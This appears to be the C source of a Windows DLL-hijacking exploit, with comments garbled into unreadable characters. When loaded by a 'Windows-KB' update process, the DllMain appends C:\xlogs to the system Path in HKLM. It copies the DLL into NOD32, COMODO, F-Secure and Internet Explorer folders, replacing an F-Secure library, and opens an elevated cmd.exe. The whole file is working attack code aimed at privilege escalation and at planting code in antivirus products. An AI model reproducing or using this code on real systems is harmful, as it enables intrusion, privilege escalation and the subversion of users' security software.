/***************************************************************************************************************\
*																												*
*											MAIN.C																*
*																												*
* ������ dll'�� ������������� ��� ����� ����������� ���������� ������, ���� ��� ��� ��� ������ ����.			*
*																												*
\***************************************************************************************************************/

																							//m1x
																							//pr0mix@mail.ru
																							//EOF



#include "main.h"



#pragma comment(linker, "/EXPORT:xMsgBox=_xMsgBox@16")	//����� ��������!
#pragma comment(linker, "/EXPORT:DllRegisterServer=_DllRegisterServer@0")



#define MAX_LEN_BUF (1024 * 2)



/***************************************************************************************************\
*	����� ChangeRegKey; 
*	��������� (����������) �������� ��������� ������� (� ������ �������� ��������� ��� �������� � 'Path');
*	����:
*		hKey		-	���������� ���������� ����� �������;
*		pszSubKey	-	����� ����� ������������ �������� (������� �������)
*		pszValName	-	����� ����� ��������� (��������);
*		pszAddVal	-	����� ���������� ��������, ������� ����� ��������� � ��� ������������ �������� ���������� ���������; 
*	�����:
*		1			-	���� �� ������ �������, ��� 0 - ���� �����
*	��������:
*		�� ��������� � ���� ������ ���������� ��������� ���������� ��������� 'Path'; 
*		� Win7/etc - ��� ��������� ����������, ��� ��� ����� ���������� =)! 
\***************************************************************************************************/
DWORD ChangeRegKey(HKEY hKey, char *pszSubKey, char *pszValName, char *pszAddVal)
{
	long lRes;
	HKEY hNewKey;
	char *pszData;
	DWORD num = MAX_LEN_BUF;
	DWORD dwRes = 0;

	lRes = RegOpenKeyExA(hKey, pszSubKey, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hNewKey);	//open the specified reg key; 

	if(lRes != ERROR_SUCCESS)
		return 0;

	lRes = RegQueryValueExA(hNewKey, pszValName, 0, 0, 0, &num);	//get num_bytes for our buffer; 

	if(lRes != ERROR_SUCCESS)
		return 0;
	else
	{
		pszData = (char*)malloc(sizeof(char) * num + strlen(pszAddVal) + 1);	//alloc
		lRes = RegQueryValueExA(hNewKey, pszValName, 0, 0, pszData, &num);	//get reg key value;

		if(lRes != ERROR_SUCCESS)
		{
			free(pszData);
			return 0;
		}
	}

	strcat(pszData, pszAddVal);	//add new value;
	lRes = RegSetValueExA(hNewKey, pszValName, 0, REG_EXPAND_SZ, pszData, strlen(pszData) + 1);	//update reg key value; 
	free(pszData); 

	if(lRes != ERROR_SUCCESS)
		return 0;

	lRes = RegCloseKey(hNewKey);	//close reg key;

	if(lRes != ERROR_SUCCESS)
		return 0;

	//tell the system (programs etc) about change (new path); 
	SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)"Environment", SMTO_ABORTIFHUNG, 5000, &dwRes);

	return 1;
}
/***************************************************************************************************\
*	����� ����� ChangeRegKey; 	
\***************************************************************************************************/



/***************************************************************************************************\
*	����� xMsgBox; 
*	������������ ������ dll ���� � ������� ����� rundll32.exe;
*	����:
*		hWnd		-	��������� ����, ������� ������ ����������� � �������� ������������� ���� ��� �������� ���� � �������� ����������� ���������� DLL; 
*		hInst		-	��������� ���������� ��������� ���������� DLL;
*		lpszCmdLine	-	��������� ������, ������������ ���������� DLL. ������ ������ ������������ ����� ������������������ �������� ASCII, ������������� �������� � ����� 0; 
*		nCmdShow	-	����� ����������� ���� ��������� ���������� DLL;
*	�����:
*		(+)
*	��������:
*		for test; e.g, rundll32.exe xnewdll.dll,xMsgBox VX! 
*		��� ������ ������ ��� � ����� �� rundll32.exe ��������� ���������� � ������� _stdcall (
*		�� ��������� ��� �������� _stdcall ������������ �������� CALLBACK); 
\***************************************************************************************************/
DLLEXPORTC void CALLBACK xMsgBox(HWND hWnd, HINSTANCE hInst, LPSTR lpszCmdLine, int nCmdShow)
{
	MessageBoxA(0, lpszCmdLine, lpszCmdLine, MB_OK);	//! 
}
/***************************************************************************************************\
*	����� ����� xMsgBox; 
\***************************************************************************************************/



/***************************************************************************************************\
*	����� DllRegisterServer; 
*	������������� ��� nod32 - ���� ������������ ��� ppeset.dll, �� ���32 ��� ������� ������� 
*	����� � ���� ������. �������� �������, �� ���� �������������!
*	(+)
\***************************************************************************************************/
DLLEXPORTC DWORD __stdcall DllRegisterServer()
{
	HANDLE hFile;
	char szMsg1[] = "Hello from DllRegisterServer!\r\n";
	DWORD numobw = 0;

	hFile = CreateFileA(szLogName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, 
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);	//open our log-file;

	if(hFile == INVALID_HANDLE_VALUE)
	{
		return 0; 
	}

	SetFilePointer(hFile, 0, 0, FILE_END);	//������� ��������� ������� � ����� � ����� (��� ����� ��������� ������ � ���); 
	WriteFile(hFile, szMsg1, strlen(szMsg1), &numobw, 0);	//���������� ������
	CloseHandle(hFile);	//��������� ����� � �� �����! 

	return 0;
}
/***************************************************************************************************\
*	����� ����� DllRegisterServer; 
\***************************************************************************************************/



/***************************************************************************************************\
*	����� DllMain; 
*	�������������� ����� ����� � ������������ ����������� dll; 
*	����:
*		(+)
*	�����:
*		1	-	dll �����������; 0 - ���-�� ����� �� ��� - � ��� ����� ��������� ��������; 
\***************************************************************************************************/
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	HANDLE hFile; 
	char szMsg1[] = "Hello from DllMain!\r\n";
	char szMsg2[MAX_PATH * 2] = "DllMain: ";
	DWORD numobw = 0;

	if(fdwReason == DLL_PROCESS_ATTACH)	//��� �������� ��� ��� ����� ���� ��� ����� LoadLibrary; 
	{
		hFile = CreateFileA(szLogName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, 
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);	//������ ���-���� (������ ������������ ����� C:\xlogs); 

		if(hFile == INVALID_HANDLE_VALUE)
		{
			return 0; 
		}

		GetModuleFileNameA(0, &szMsg2[strlen(szMsg2)], MAX_PATH);	//�������� ��� exe-�����, ������������ ���� ���;

		if(strstr(szMsg2, "Windows-KB"))	//���� ���� ��� ��������� ������ �����
		{
			if(ChangeRegKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "Path", ";C:\\xlogs"))
			{
				GetModuleFileNameA(GetModuleHandleA("feclient.dll"), szFileName, MAX_PATH);	//�������� ������ ���� � ����� ��� (���� ��� ������ ����� ��� feclient.dll - ��� ��� ��� ����, ����� ���� ������������ ������� ����� (��� dll hijacking)); 
				CopyFileA(szFileName, "C:\\xlogs\\ppeset.dll", 0);	//�������� � � ������ ����� � ���������� ��������� (for nod32); 
				CopyFileA(szFileName, "C:\\Program Files\\COMODO\\COMODO Internet Security\\themes\\xnewdll.theme", 0);	//for comodo
				MoveFileA("C:\\Program Files\\F-Secure\\apps\\CCF_Reputation\\orspapi.dll", "C:\\Program Files\\F-Secure\\apps\\CCF_Reputation\\orspapi2.dll");	//for f-secure; 
				CopyFileA(szFileName, "C:\\Program Files\\F-Secure\\apps\\CCF_Reputation\\orspapi.dll", 0);	//for f-secure; 
				CopyFileA(szFileName, "C:\\Program Files\\Internet Explorer\\xnewdll.dll", 0);	//������ ���)
				ShellExecuteA(NULL, "open", "C:\\WINDOWS\\System32\\cmd.exe", NULL, NULL, SW_SHOW);	//�������� ��������� ������ (� ���������� ������� � ������ ������); 
			}
		}
		
		strcat(szMsg2, "\r\n");	//������� �� ����� ������
		WriteFile(hFile, szMsg1, strlen(szMsg1), &numobw, 0);	//����� ������ � ���-����; 
		SetFilePointer(hFile, 0, 0, FILE_END);	//��������� � ����� ����� (�� ����� ������);
		WriteFile(hFile, szMsg2, strlen(szMsg2), &numobw, 0);	//etc 
		CloseHandle(hFile); 
	}

	return 1;
}
/***************************************************************************************************\
*	����� ����� DllMain; 
\***************************************************************************************************/
